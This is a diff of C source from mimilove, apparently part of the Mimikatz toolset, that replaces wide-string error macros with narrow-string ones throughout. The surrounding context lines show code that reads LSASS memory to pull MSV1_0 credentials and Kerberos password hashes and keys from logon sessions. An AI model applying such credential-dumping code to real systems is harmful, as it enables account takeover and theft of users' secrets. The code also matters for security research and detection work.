@@ -38,12 +38,12 @@ int wmain(int argc, wchar_t *argv[])
 					}
 					CloseHandle(hProcess);
 				}
-				else PRINT_ERROR_AUTO(L"OpenProcess");
+				else PRINT_ERROR_AUTO_C("OpenProcess");
 			}
 		}
 		else PRINT_ERROR(L"Only for Windows 2000\n");
 	}
-	else PRINT_ERROR_AUTO(L"GetVersionEx");
+	else PRINT_ERROR_AUTO_C("GetVersionEx");
 
 	return ERROR_SUCCESS;
 }
@@ -221,7 +221,7 @@ void mimilove_lsasrv(PKULL_M_MEMORY_HANDLE hMemory)
 																	}
 																	else
 																	{
-																		PRINT_ERROR_AUTO(L"kull_m_memory_copy / KIWI_MSV1_0_PRIMARY_CREDENTIALS");
+																		PRINT_ERROR_AUTO_C("kull_m_memory_copy / KIWI_MSV1_0_PRIMARY_CREDENTIALS");
 																		break;
 																	}
 																}
@@ -230,37 +230,37 @@ void mimilove_lsasrv(PKULL_M_MEMORY_HANDLE hMemory)
 														}
 														else
 														{
-															PRINT_ERROR_AUTO(L"kull_m_memory_copy / KIWI_MSV1_0_CREDENTIALS");
+															PRINT_ERROR_AUTO_C("kull_m_memory_copy / KIWI_MSV1_0_CREDENTIALS");
 															break;
 														}
 													}
 													kprintf(L"\n");
 												}
 											}
-											else PRINT_ERROR_AUTO(L"kull_m_memory_copy / KIWI_MSV1_0_ENTRY_50");
+											else PRINT_ERROR_AUTO_C("kull_m_memory_copy / KIWI_MSV1_0_ENTRY_50");
 										}
 										else PRINT_ERROR(L"list.entry is NULL\n");
 										aLsassMemory.address = list.Flink;
 									}
 									else
 									{
-										PRINT_ERROR_AUTO(L"kull_m_memory_copy / KIWI_MSV1_0_LIST_50");
+										PRINT_ERROR_AUTO_C("kull_m_memory_copy / KIWI_MSV1_0_LIST_50");
 										break;
 									}
 								}
 							}
 							else PRINT_ERROR(L"table.list is NULL\n");
 						}
-						else PRINT_ERROR_AUTO(L"kull_m_memory_copy / KIWI_MSV1_0_LOGON_SESSION_TABLE_50");
+						else PRINT_ERROR_AUTO_C("kull_m_memory_copy / KIWI_MSV1_0_LOGON_SESSION_TABLE_50");
 					}
 				}
 				else PRINT_ERROR(L"LogonSessionTable is NULL\n");
 			}
-			else PRINT_ERROR_AUTO(L"kull_m_memory_copy / ptr 1");
+			else PRINT_ERROR_AUTO_C("kull_m_memory_copy / ptr 1");
 		}
-		else PRINT_ERROR_AUTO(L"lsasrv pattern not found");
+		else PRINT_ERROR_AUTO_C("lsasrv pattern not found");
 	}
-	else PRINT_ERROR_AUTO(L"lsasrv module info");
+	else PRINT_ERROR_AUTO_C("lsasrv module info");
 }
 
 void mimilove_kerberos(PKULL_M_MEMORY_HANDLE hMemory)
@@ -347,11 +347,11 @@ void mimilove_kerberos(PKULL_M_MEMORY_HANDLE hMemory)
 													}
 												}
 											}
-											else PRINT_ERROR_AUTO(L"kull_m_memory_copy / KERB_HASHPASSWORD_5");
+											else PRINT_ERROR_AUTO_C("kull_m_memory_copy / KERB_HASHPASSWORD_5");
 											LocalFree(pKeys);
 										}
 									}
-									else PRINT_ERROR_AUTO(L"kull_m_memory_copy / KIWI_KERBEROS_KEYS_LIST_5");
+									else PRINT_ERROR_AUTO_C("kull_m_memory_copy / KIWI_KERBEROS_KEYS_LIST_5");
 								}
 								kprintf(L"\n");
 
@@ -366,18 +366,18 @@ void mimilove_kerberos(PKULL_M_MEMORY_HANDLE hMemory)
 						}
 						else
 						{
-							PRINT_ERROR_AUTO(L"kull_m_memory_copy / KIWI_KERBEROS_LOGON_SESSION_50");
+							PRINT_ERROR_AUTO_C("kull_m_memory_copy / KIWI_KERBEROS_LOGON_SESSION_50");
 							break;
 						}
 					}
 				}
 				else PRINT_ERROR(L"KerbLogonSessionList is NULL\n");
 			}
-			else PRINT_ERROR_AUTO(L"kull_m_memory_copy / ptr 1");
+			else PRINT_ERROR_AUTO_C("kull_m_memory_copy / ptr 1");
 		}
-		else PRINT_ERROR_AUTO(L"kerberos pattern not found");
+		else PRINT_ERROR_AUTO_C("kerberos pattern not found");
 	}
-	else PRINT_ERROR_AUTO(L"kerberos module info");
+	else PRINT_ERROR_AUTO_C("kerberos module info");
 }
 
 PCWCHAR mimilove_kerberos_etype(LONG eType)
